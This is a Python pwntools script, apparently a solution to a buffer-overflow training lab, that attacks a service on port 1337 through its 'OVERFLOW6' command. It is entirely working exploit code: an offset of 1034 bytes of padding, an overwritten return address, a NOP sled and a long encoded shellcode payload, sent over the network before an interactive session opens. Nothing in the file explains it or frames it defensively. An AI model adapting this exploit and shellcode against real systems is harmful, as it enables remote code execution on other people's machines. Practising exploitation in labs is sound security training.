#!/usr/bin/env python3

from pwn import *

ip = "10.10.184.172"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
buffer = "A" * offset
retn = "\xbb\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbd\x71\xc3\xbf\x44\xd9\xf7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xea\xfc\x31\x6a\x0e\x03\x1b\xcd\x5d\xb1\x27\x39\x23"
"\x3a\xd7\xba\x44\xb2\x32\x8b\x44\xa0\x37\xbc\x74\xa2\x15\x31"
"\xfe\xe6\x8d\xc2\x72\x2f\xa2\x63\x38\x09\x8d\x74\x11\x69\x8c"
"\xf6\x68\xbe\x6e\xc6\xa2\xb3\x6f\x0f\xde\x3e\x3d\xd8\x94\xed"
"\xd1\x6d\xe0\x2d\x5a\x3d\xe4\x35\xbf\xf6\x07\x17\x6e\x8c\x51"
"\xb7\x91\x41\xea\xfe\x89\x86\xd7\x49\x22\x7c\xa3\x4b\xe2\x4c"
"\x4c\xe7\xcb\x60\xbf\xf9\x0c\x46\x20\x8c\x64\xb4\xdd\x97\xb3"
"\xc6\x39\x1d\x27\x60\xc9\x85\x83\x90\x1e\x53\x40\x9e\xeb\x17"
"\x0e\x83\xea\xf4\x25\xbf\x67\xfb\xe9\x49\x33\xd8\x2d\x11\xe7"
"\x41\x74\xff\x46\x7d\x66\xa0\x37\xdb\xed\x4d\x23\x56\xac\x19"
"\x80\x5b\x4e\xda\x8e\xec\x3d\xe8\x11\x47\xa9\x40\xd9\x41\x2e"
"\xa6\xf0\x36\xa0\x59\xfb\x46\xe9\x9d\xaf\x16\x81\x34\xd0\xfc"
"\x51\xb8\x05\x52\x01\x16\xf6\x13\xf1\xd6\xa6\xfb\x1b\xd9\x99"
"\x1c\x24\x33\xb2\xb7\xdf\xd4\xb7\x55\x91\xf5\xa0\x5b\x2d\xc6"
"\x09\xd5\xcb\x4c\x7a\xb3\x44\xf9\xe3\x9e\x1e\x98\xec\x34\x5b"
"\x9a\x67\xbb\x9c\x55\x80\xb6\x8e\x02\x60\x8d\xec\x85\x7f\x3b"
"\x98\x4a\xed\xa0\x58\x04\x0e\x7f\x0f\x41\xe0\x76\xc5\x7f\x5b"
"\x21\xfb\x7d\x3d\x0a\xbf\x59\xfe\x95\x3e\x2f\xba\xb1\x50\xe9"
"\x43\xfe\x04\xa5\x15\xa8\xf2\x03\xcc\x1a\xac\xdd\xa3\xf4\x38"
"\x9b\x8f\xc6\x3e\xa4\xc5\xb0\xde\x15\xb0\x84\xe1\x9a\x54\x01"
"\x9a\xc6\xc4\xee\x71\x43\xe4\x0c\x53\xbe\x8d\x88\x36\x03\xd0"
"\x2a\xed\x40\xed\xa8\x07\x39\x0a\xb0\x62\x3c\x56\x76\x9f\x4c"
"\xc7\x13\x9f\xe3\xe8\x31")
postfix = ""

attack = prefix + buffer + retn + padding + payload + postfix

def start():
    if args.REMOTE:
        return remote(ip, port)

p = start()

def ret_leak():
    p.sendline(bytes(attack, "latin-1"))

ret_leak()
p.interactive()
